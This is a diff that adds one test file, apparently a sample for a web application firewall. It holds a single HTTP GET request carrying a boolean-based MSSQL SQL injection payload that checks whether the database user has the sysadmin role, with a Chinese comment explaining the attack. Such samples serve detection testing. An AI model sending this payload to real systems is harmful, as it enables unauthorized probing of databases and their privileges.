@@ -1,0 +1,9 @@
+# SQL注入_GET_mssql_布尔注入-06506442
+# 攻击者基于布尔查询，将"1=(select IS_SRVROLEMEMBER('sysadmin'))"语句注入到 SQL 查询参数中，利用函数IS_SRVROLEMEMBER()判断当前用户是否是sysadmin权限。
+GET /?id=1%20and%201=%28select%20IS_SRVROLEMEMBER%28%27sysadmin%27%29%29&bid=hd_tag_m8mv26n4 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv26n4
+RM-PRO-Token: 1439febf224a45aad2a83fc7501c9e3a
+RM-PRO-Time: 1742808639122
+User-Agent: curl/7.83.1
+
